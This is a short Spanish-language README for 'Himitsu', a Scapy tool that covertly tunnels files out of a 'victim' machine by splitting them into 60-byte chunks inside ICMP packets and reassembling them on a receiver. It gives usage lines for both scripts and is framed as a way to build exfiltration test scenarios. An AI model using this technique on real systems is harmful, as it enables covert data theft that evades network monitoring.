# Himitsu | ICMP Tunneling

![](https://cdn-icons-png.flaticon.com/512/2267/2267436.png)


Himitsu es una herramienta creada con Scapy cuyo propósito es facilitar la generación de escenarios de pruebas para la exfiltración de datos entre estaciones utilizando el protocolo de red ICMP. Esta herramienta se encarga de dividir archivos de cualquier tipo en bloques de 60 bytes, los cuales son insertados en el campo de datos de los paquetes ICMP mediante el script "Segmentador.py" (desde la perspectiva de la víctima). Esto permite enviar imágenes, binarios, diccionarios u otro tipo de información relevante para las pruebas. Por otro lado, en la máquina receptora de la información, los paquetes ICMP son recibidos y posteriormente ensamblados mediante el script "Ensamblador.py", lo que permite reconstruir el archivo final extrayendo las cadenas recibidas en el campo de datos.

## Instrucciones de uso

### Segmentador.py
```bash
  segmentador.py <Nombre del Archivo a Enviar> <Dirección IP de Destino>
```
### Ensamblador.py
```bash
  ensamblador.py <Nombre del Archivo a Ensamblar>
```
